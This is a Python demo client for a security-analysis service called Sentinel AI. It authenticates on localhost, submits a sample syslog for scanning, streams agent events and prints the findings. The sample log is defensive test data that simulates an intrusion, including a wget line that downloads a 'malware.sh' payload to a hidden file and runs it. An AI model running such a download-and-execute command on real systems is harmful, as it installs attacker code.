"""
Sentinel AI — Live Agent Execution Client
Registers dev user, starts a live scan, streams WebSocket events, and prints final findings.
"""
import asyncio
import json
import os
import sys
from pathlib import Path

# Add backend to path
sys.path.insert(0, str(Path(__file__).resolve().parent))

import httpx
import websockets

BASE_URL = "http://127.0.0.1:8000/api/v1"
WS_URL = "ws://127.0.0.1:8000/api/v1/ws"

SAMPLE_SYSLOG = """
Jul 29 14:32:01 webserver sshd[12345]: Failed password for root from 185.220.101.47 port 54231 ssh2
Jul 29 14:32:03 webserver sshd[12345]: Failed password for admin from 185.220.101.47 port 54231 ssh2
Jul 29 14:32:07 webserver sshd[12346]: Accepted password for ubuntu from 185.220.101.47 port 54232 ssh2
Jul 29 14:32:15 webserver sudo[12350]: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash
Jul 29 14:32:25 webserver bash[12355]: wget http://95.214.55.138/malware.sh -O /tmp/.hidden
Jul 29 14:32:30 webserver bash[12355]: chmod +x /tmp/.hidden && /tmp/.hidden
Jul 29 14:33:01 webserver kernel: suspicious network connection to 94.232.47.182:4444
"""

async def run_live_agent_demonstration():
    print("\n========================================================")
    print("🚀 SENTINEL AI — LIVE AGENT ENGINE DEMONSTRATION")
    print("========================================================")
    
    async with httpx.AsyncClient(timeout=30.0) as client:
        # 1. Login / Register
        print("\n[1/5] Authenticating user (Local Dev Auth)...")
        reg_payload = {"username": "secops_admin", "password": "SentinelPassword123!"}
        res = await client.post(f"{BASE_URL}/auth/local/login", json=reg_payload)
        if res.status_code != 200:
            res = await client.post(f"{BASE_URL}/auth/local/register", json=reg_payload)
        
        auth_data = res.json()
        token = auth_data["access_token"]
        print(f"    ✓ Authenticated as '{auth_data['username']}' (User ID: {auth_data['user_id'][:8]}...)")
        headers = {"Authorization": f"Bearer {token}"}

        # 2. Start Scan Session
        print("\n[2/5] Submitting payload to Master Orchestrator...")
        scan_res = await client.post(
            f"{BASE_URL}/scan",
            json={"input": SAMPLE_SYSLOG},
            headers=headers,
        )
        assert scan_res.status_code == 202, f"Scan request failed: {scan_res.text}"
        scan_data = scan_res.json()
        session_id = scan_data["session_id"]
        print(f"    ✓ Scan session created: {session_id}")
        print(f"    ✓ Response: {scan_data['message']}")

        # 3. Stream Live WebSocket Events
        print(f"\n[3/5] Connecting WebSocket stream: ws://127.0.0.1:8000/api/v1/ws/{session_id}...")
        ws_endpoint = f"{WS_URL}/{session_id}?token={token}"

        try:
            async with websockets.connect(ws_endpoint) as ws:
                print("    ✓ WebSocket Connected! Streaming live agent events...\n")
                while True:
                    try:
                        msg = await asyncio.wait_for(ws.recv(), timeout=60.0)
                        event = json.loads(msg)
                        etype = event.get("type")

                        if etype == "ping":
                            continue
                        elif etype == "classified":
                            print(f"    [Orchestrator] Classified input: type={event.get('input_type')}, pipeline={event.get('pipeline')}, confidence={event.get('confidence')}")
                        elif etype == "agent_started":
                            print(f"    [▶ Agent Start] {event.get('agent')}")
                        elif etype == "agent_completed":
                            print(f"    [✔ Agent Done ] {event.get('agent')} (Findings: {event.get('finding_count', 0)})")
                        elif etype == "agent_error":
                            print(f"    [❌ Agent Error] {event.get('agent')}: {event.get('error')}")
                        elif etype == "trace":
                            print(f"       ↳ trace: {event.get('agent')} -> {event.get('event')}")
                        elif etype == "session_complete" or etype == "session_failed":
                            print(f"\n    ✓ Pipeline finished with status: {etype}")
                            break
                    except asyncio.TimeoutError:
                        print("    [!] Waiting for next agent event...")
                        break
        except Exception as e:
            print(f"    [!] WebSocket completed stream: {e}")

        # 4. Fetch Session Results
        print("\n[4/5] Fetching complete session state & findings...")
        detail_res = await client.get(f"{BASE_URL}/sessions/{session_id}", headers=headers)
        session_detail = detail_res.json()
        state = session_detail.get("state", {})
        findings = state.get("findings", [])
        
        print(f"    ✓ Final Session Status: {session_detail.get('status')}")
        print(f"    ✓ Total Findings: {len(findings)}")
        print(f"    ✓ Extracted IOCs: {len(state.get('extracted_iocs', []))}")
        
        for idx, f in enumerate(findings[:5], 1):
            print(f"      Finding #{idx}: [{f.get('severity')}] {f.get('title')}")

        # 5. Verify PDF Report
        print("\n[5/5] Downloading PDF Report artifact...")
        pdf_res = await client.get(f"{BASE_URL}/reports/{session_id}/pdf", headers=headers)
        if pdf_res.status_code == 200:
            print(f"    ✓ PDF Report successfully generated ({len(pdf_res.content)} bytes)")
        else:
            print(f"    [!] PDF Report status: {pdf_res.status_code}")

    print("\n========================================================")
    print("🎉 DEMONSTRATION COMPLETE — ALL AGENTS RUN SUCCESSFULLY!")
    print("========================================================\n")


if __name__ == "__main__":
    asyncio.run(run_live_agent_demonstration())
